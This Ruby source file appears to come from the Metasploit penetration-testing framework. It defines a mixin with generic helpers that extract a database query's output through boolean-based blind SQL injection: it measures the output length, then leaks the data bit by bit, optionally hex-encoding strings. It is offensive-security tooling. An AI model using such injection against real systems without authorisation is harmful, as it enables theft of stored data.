
module Msf::Exploit::SQLi

  #
  # This mixin provides some methods used by boolean-based blind SQL injection implementations that are
  # the same across implementations.
  #
  module BooleanBasedBlindMixin
    #
    #   Gets the output of the given SQL query, in a boolean-based blind manner.
    #   The block given to initialize must return true if querying its parameter
    #   gave a result, false otherwise.
    #   @param query [String] The SQL query to execute
    #   @param output_charset [Range] The range of characters to expect in the output, optional
    #   can improve performance a lot, as fewer bits need to be guessed on each character.
    #   example : ('0' .. '9') if you know the output of your query contains only numeric characters
    #   @return [String] The query results
    #
    def run_sql(query, output_charset: nil)
      if output_charset.is_a?(Range) && output_charset.count > 0
        known_bits, bits_to_guess = Msf::Exploit::SQLi::Utils::Common.get_bitmask(output_charset)
      else
        known_bits = 0
        bits_to_guess = 8
      end
      vprint_status "{SQLi} Executing (#{query})"
      if @hex_encode_strings
        query = hex_encode_strings(query)
        vprint_status "{SQLi} Encoded to (#{query})"
      end
      # first, get the length of the output
      output_length = blind_detect_length(query, false)
      vprint_status "{SQLi} Boolean-based injection: expecting output of length #{output_length}"
      # now, get the output, of the given length
      blind_dump_data(query, output_length, known_bits, bits_to_guess, false)
    end

    #
    # Performs one request, should leak one bit of information
    # (if return value is not false or nil, 1, 0 otherwise)
    # @param query [String] The SQL query to run
    # @return [Object] should return a true value if the query returned a result, false or nil otherwise
    #
    def blind_request(query)
      @query_proc.call(query)
    end
  end
end
